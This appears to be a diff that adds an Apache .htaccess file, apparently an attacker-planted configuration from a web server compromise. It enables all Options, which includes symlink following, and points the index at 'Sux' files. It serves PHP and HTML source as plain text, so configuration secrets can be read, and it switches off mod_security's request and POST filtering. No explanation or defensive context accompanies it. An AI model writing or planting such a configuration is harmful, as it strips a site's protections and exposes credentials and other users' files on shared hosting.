@@ -1,0 +1,13 @@
+Options all
+DirectoryIndex Sux.html
+DirectoryIndex Sux.php
+AddType text/plain .php
+AddHandler server-parsed .php
+AddType text/plain .html
+<IfModule mod_autoindex.c> 
+IndexOptions FancyIndexing IconsAreLinks SuppressHTMLPreamble 
+</ifModule>
+<IfModule mod_security.c> 
+SecFilterEngine Off 
+SecFilterScanPOST Off 
+</IfModule>
